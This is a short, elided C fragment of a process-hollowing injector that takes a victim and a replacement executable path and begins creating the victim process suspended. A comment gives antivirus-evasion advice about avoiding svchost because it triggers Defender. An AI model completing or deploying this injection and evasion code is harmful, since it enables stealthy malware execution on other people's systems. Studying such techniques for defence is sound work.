...
int main(int argc, char* argv[]) {
	...
	if (argc != 3) {
		printf("You must pass the exe path to be create the process and the exe path to inject inside the previous created process, e.g.");
	...
	//DON'T USE svchost because triggers Defender
	LPCSTR victimImage = argv[1];

	// Must be win32 bit exe, also use the /MT or /MTd compiler option,  
	LPCSTR replacementImage = argv[2];

	// Create victim process in a suspended mode
	if (!CreateProcessA(
			0,
			(LPSTR)victimImage,
			0,
